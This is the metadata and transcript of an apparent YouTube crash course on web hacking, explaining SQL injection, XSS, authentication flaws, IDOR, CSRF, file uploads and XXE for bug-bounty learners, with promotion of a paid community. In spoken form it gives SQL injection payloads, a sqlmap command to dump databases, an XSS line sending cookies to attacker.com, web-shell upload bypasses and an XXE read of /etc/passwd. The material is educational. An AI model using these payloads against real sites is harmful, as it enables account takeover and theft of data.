@@ -1,0 +1,83 @@
+---
+video_title: "ALL of Web Hacking in 7 Minutes (No BS, No Fluff)"
+video_id: JbzbWDVDqFo
+channel_name: "CyberFlow"
+channel_id: UCUvkPEm38w6pq8w5QYgtPPw
+channel_category: "Education"
+url: https://www.youtube.com/watch?v=JbzbWDVDqFo
+video_date: 2025-12-11T16:05:28+00:00
+video_description: |
+  Join The Family:💻👩🏻‍💻https://cyberflow-academy.framer.website/
+  Check Out The Courses We Offer: https://cyberflow-academy.framer.website/courses
+  
+  Educational Purposes Only.
+  
+  This is the fastest, clearest crash course on web hacking you’ll ever watch.
+  No BS, no fluff, no 40-hour courses, just pure, practical web security broken down in 7 minutes.
+  
+  If you want to learn bug bounty, pentesting, or modern web app security, this video gives you every core vulnerability, the mindset behind exploiting them, and the exact attack paths real hackers use daily.
+  
+  This is the web hacking overview I wish I had when I started, simple, visual, and actually useful.
+  
+  0:00  Intro  
+  0:44  SQL Injection  
+  1:57  Cross-Site Scripting (XSS)  
+  2:35  Authentication Flaws  
+  3:23  IDOR / Broken Access Control  
+  4:06  CSRF  
+  4:49  File Upload Vulnerabilities  
+  5:20  XXE  
+  5:41  Outro
+  
+  🧰 useful resources
+  
+  OWASP Web Security Testing Guide
+  https://owasp.org/www-project-web-security-testing-guide/
+  
+  PortSwigger Web Academy
+  https://portswigger.net/web-security
+  
+  HackTricks Web Hacking Handbook
+  https://book.hacktricks.xyz/
+  
+  Burp Suite Community Edition
+  https://portswigger.net/burp
+  
+  
+  #hacking #ethicalhacking #bugbounty #cybersecurity #hacker #pentesting #infosec #cyberattack #hackingtools #sqlinjection #metasploit #cyberflowsacademy
+  
+  → Email: cyberflow10@gmail.com  
+  
+  
+  I believe in you. You can do it. 🖤
+  ======================
+  .▀█▀.█▄█.█▀█.█▄.█.█▄▀　█▄█.█▀█.█─█
+  ─.█.─█▀█.█▀█.█.▀█.█▀▄　─█.─█▄█.█▄█
+---
+Web hacking is ninety percent of all bug bounties and penetration tests but most people waste months learning tools instead of understanding what they're actually exploiting. People memorize Burp shortcuts and watch fifty-hour courses yet still can’t explain why a single quote breaks an app. In the next seven minutes I'm breaking down every web vulnerability that actually matters SQL injection XSS CSRF authentication bypass IDOR and how to find and exploit each one without spending three years grinding PortSwigger Academy challenges that feel like homework. And before we get started if you want to actually learn this stuff properly with real labs and step by step courses join our private community. First link in the description. More
+
+on that later because right now you need the fundamentals drilled into your brain. SQL injection is when you inject malicious SQL code into input fields to manipulate database queries. If a website takes user input and puts it directly into a SQL query without sanitization you can break out of the query and execute your own commands. Classic example a login form that checks SELECT star FROM users WHERE username equals your input and password equals your input. If you enter admin apostrophe OR 1 equals 1 dash dash as the username you're telling the database OR 1 equals 1 which is always true so it logs you in as admin. The dash dash comments
+
+out the rest of the query so the password check gets ignored entirely like it never existed. In 2025 SQL injection is still ranked fifth in the OWASP Top 10 even though it's older than half the people watching this video because developers keep reinventing insecure wheels. To find SQL injection manually test every input field with payloads like apostrophe OR 1 equals 1 dash dash or apostrophe UNION SELECT NULL dash dash. If you get database errors or weird behavior like blank pages or delays congrats you probably have SQL injection. Use SQLmap to automate exploitation with sqlmap dash u target URL dash dash dbs to dump all databases. SQL
+
+injection can lead to full database compromise including passwords credit cards PII internal secrets literally everything. That’s why it’s often a five figure bounty and why companies panic the second you submit a valid report. XSS is when you inject JavaScript into a web page that gets executed in other users' browsers. There are three types reflected where your payload appears in the URL, stored where your payload gets saved in the database like a comment section, and DOM based where the vulnerability is in client side JavaScript. The classic test payload is script alert XSS script. If you inject this into a search box or comment field and it pops an alert you have
+
+XSS. But alert boxes are boring. Real attackers steal cookies with script document location equals attacker dot com slash steal dot php question mark cookie equals document dot cookie script. This sends the victim's cookie to your server and boom you hijack their account. XSS is everywhere because developers sanitize input like “yeah that looks safe enough” and forget output encoding entirely. In the 2025 OWASP Top 10 XSS is grouped under Injection at number five which tells
+
+you how widespread it still is. To find XSS test every input field with payloads and check if your JavaScript executes. Use Burp to inject payloads into parameters headers and cookies. XSS impacts range from funny pranks to full account takeover and stored XSS can pay up to ten thousand dollars. Authentication flaws let attackers bypass login mechanisms or hijack user sessions. Common issues
+
+include weak passwords no rate limiting no lockout missing HTTPOnly flags missing Secure flags predictable tokens and session IDs that look like a random number but actually aren’t. If session cookies aren’t HTTPOnly XSS can steal them. If they aren’t Secure you can sniff them. Testing authentication means checking edge cases like can you brute force passwords freely can you reset someone else's password by manipulating tokens can you reuse old session cookies after logout. In 2025 authentication failures sit at number seven in OWASP because companies still treat auth as an afterthought. Finding auth bypass vulnerabilities gets you critical severity
+
+and huge payouts because full account takeover is basically “press this button to ruin the company.” IDOR is when you can access resources by manipulating identifiers in URLs or parameters without proper authorization checks. Classic example example dot com slash user slash profile question mark id equals 123. Change to 124 and if you suddenly see someone else’s profile that’s IDOR. The app isn’t checking if you're authorized it just hands you whatever ID you ask for. IDOR
+
+lives under Broken Access Control which is number one in the OWASP 2025 list making it the biggest risk right now. To find IDOR look at parameters referencing anything user IDs invoice IDs order numbers tickets files messages. Change the value. If the app leaks data congrats. Burp Intruder makes enumerating IDs trivial. IDOR is
+
+especially common in APIs because developers assume nobody will modify parameters. A solid IDOR is easily a critical report because you’re demonstrating unauthorized data access at scale. CSRF is when an attacker tricks a victim into performing actions on a website where they're already authenticated. Example you're logged into your bank an attacker sends you a malicious link that triggers a transfer via your current session. The site sees a request from your session and approves it because there’s no verification that _you_ made the request.
+
+CSRF tokens solve this but only if they’re correctly implemented. To test for CSRF look for sensitive actions remove the token and see if the request still works. Burp helps you craft malicious requests. CSRF is now under Security Misconfiguration but still extremely dangerous. Severity depends on the action — if you can change someone’s email or password it’s often high.
+
+File upload vulnerabilities occur when applications don’t validate uploads properly letting attackers upload malicious files like web shells. Classic example upload shell dot php disguised as a JPG. If the server executes PHP in that directory you have remote code execution. Bypass filters with double extensions null byte injections modified headers or filename tricks. Once uploaded you just visit the shell in the browser and run system commands. File upload to RCE is always critical.
+
+XXE abuses XML parsers that allow external entities. You inject a DOCTYPE that loads file colon slash slash etc slash passwd and the server happily reads and returns it. XXE can also do SSRF or even RCE in weird setups. Test any XML input or SOAP request by injecting malicious entities. If the response contains file contents you’ve found XXE.
+
+If you’re thinking cool I get the concepts but how do I actually apply this to find real bugs and make real money because knowing what SQLi is doesn’t pay bills then check out CyberFlow Academy my private community.
